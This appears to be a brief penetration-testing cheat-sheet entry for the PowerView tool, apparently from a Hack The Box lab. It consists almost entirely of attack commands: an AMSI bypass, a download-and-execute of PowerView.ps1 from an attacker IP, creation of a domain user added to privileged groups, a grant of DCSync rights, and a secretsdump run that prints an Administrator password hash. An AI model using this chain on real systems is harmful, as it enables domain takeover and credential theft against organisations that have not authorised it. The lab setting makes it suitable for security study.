# Name
PowerView

## Usage
```
## Add user with DCsync access rights to dump administrator's hash
*Evil-WinRM* PS C:\temp> Bypass-4MSI
*Evil-WinRM* PS C:\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.4/PowerView.ps1')
*Evil-WinRM* PS C:\temp> net user john abc123! /add /domain
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions" john /add
*Evil-WinRM* PS C:\temp> net localgroup "Remote Management Users" john /add
*Evil-WinRM* PS C:\temp> $pass = convertto-securestring 'abc123!' -asplain -force
*Evil-WinRM* PS C:\temp> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
*Evil-WinRM* PS C:\temp> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

secretsdump.py htb/john@10.10.10.161
#[*] Using the DRSUAPI method to get NTDS.DIT secrets
#htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

## Source
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1

